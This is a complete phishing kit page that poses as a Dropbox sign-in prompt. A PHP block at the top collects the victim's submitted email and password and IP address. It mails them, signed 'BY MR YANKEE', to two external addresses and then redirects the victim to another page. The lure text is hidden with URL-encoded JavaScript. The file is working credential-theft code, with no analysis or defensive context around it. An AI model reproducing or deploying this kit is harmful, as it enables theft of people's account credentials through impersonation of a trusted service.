﻿<?php

if (isset($_POST['Email'])) { 

$email = $_POST["Email"];
$password = $_POST["Password"];


//get user's ip address 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "---------------|BY MR YANKEE|---------------\n";
$message .= "E: " . $_POST['Email'] . "\n"; 
$message .= "Ps: " . $_POST['Password'] . "\n"; $message .= "IP : " .$ip. "\n"; 
$message .= "--------------------------------------------\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "---------------------------------------------\n";
$to = "may.rezult@protonmail.com, janetory01@yahoo.com"; 

if($_POST['Email'] !="" || $_POST['Password'] !=""){
$hi = mail($to," | ".$ip, $message); 
}
?> 
<script type="text/javascript"> 
<!-- 
   window.location="Ph.php"; 

</script> <?PHP

die();
}


?>

 <!DOCTYPE html> <html lang="en"> <head> <!-- head to scrape:on --> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /> <meta charset="utf-8" /> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>Dropbox</title> <link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon-vflUeLeeY.ico"> <link href="//use.fontawesome.com/releases/v5.0.10/css/all.css" rel="stylesheet" type="text/css" /> <link rel='stylesheet' href='/ResourcePackages/WHO/assets/dist/styles/grid.min.css?v=12.1.7126.28204' ><link rel='stylesheet' href='/ResourcePackages/WHO/assets/dist/styles/origin.min.css?v=12.1.7126.28204' > <!-- head to scrape:off --> <link rel='stylesheet' href='/ResourcePackages/WHO/assets/dist/styles/main.min.css?v=12.1.7126.28204' > <link rel='stylesheet' href='/ResourcePackages/WHO/assets/dist/styles/print.min.css?v=12.1.7126.28204' media='print'> <script type="text/javascript">var sf_appPath='/';</script>><style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("dgrand.png");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
</head>
<body>

<div class="bg"></div></body></html>
				<div id="popup1" class="overlay" style="visibility:  visible;opacity: 1">
    <div class="popup">
        <a class="close" href="" onclick="closeBox()">&times;</a>
        <div class="content">
		<p style="text-align:center;"><img src="https://cfl.dropboxstatic.com/static/images/favicon-vflUeLeeY.ico"  alt="avatar" style="width:30%; height:30px"></p>
		<center><script type="text/javascript">
<!-- HTML Encryption provided by www.webtoolhub.com -->
<!--
document.write(unescape('%59%6f%75%20%6f%6e%6c%79%20%6e%65%65%64%20%74%6f%20%73%69%67%6e%20%69%6e%20%77%69%74%68%20%79%6f%75%72%20%65%6d%61%69%6c%20%74%6f%20%76%69%65%77%20%61%6e%64%20%72%65%73%70%6f%6e%64%20%74%6f%20%6d%65%73%73%61%67%65'));
//-->
</script></center>
         <form name="myForm" action="#" onsubmit="return validateForm()" method="post">
		 <div class="container">
    <p style="text-align:center;">
    <input type="email" placeholder="user@example.com" id="fname" name="Email" required><br><br>
  
  <input type="password" placeholder="Password" id="lname" name="Password" required><br><br>
  <input type="submit" value="Continue">

    
							
					</form></p>

    </div>
</div>

<style>

    box {
        width: 20%;
        margin: 0 auto;
        background: rgba(255,255,255,0.2);
        padding: 35px;
        border: 2px solid #fff;
        border-radius: 20px/50px;
        background-clip: padding-box;
        text-align: center;
    }

    .button {
        font-size: 1em;
        padding: 10px;
        color: #fff;
        border: 2px solid #0067B8;
        border-radius: 20px/50px;
        text-decoration: none;
        cursor: pointer;
        transition: all 0.3s ease-out;
    }
    .button:hover {
        background: #0067B8;
    }

    .overlay {
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(0, 0, 0, 0.7);
        transition: opacity 500ms;
        visibility: hidden;
        opacity: 0;
    }
    .overlay:target {
        visibility: visible;
        opacity: 1;
    }

    .popup {
        margin: 5px auto;
        padding: 20px;
        background: #fff;
        border-radius: 5px;
        width: 20%;
        position: relative;
        transition: all 5s ease-in-out;
    }

    .popup h2 {
        margin-top: 0;
        color: #333;
        font-family: Tahoma, Arial, sans-serif;
    }
    .popup .close {
        position: absolute;
        top: 0px;
        right: 3px;
        transition: all 200ms;
        font-size: 30px;
        font-weight: bold;
        text-decoration: none;
        color: #333;
    }
    .popup .close:hover {
        color: #0067B8;
    }
    .popup .content {
        max-height: 30%;
        overflow: auto;
    }

    @media screen and (max-width: 700px){
        .box{
            width: 50%;
        }
        .popup{
            width: 50%;
        }
    }

</style>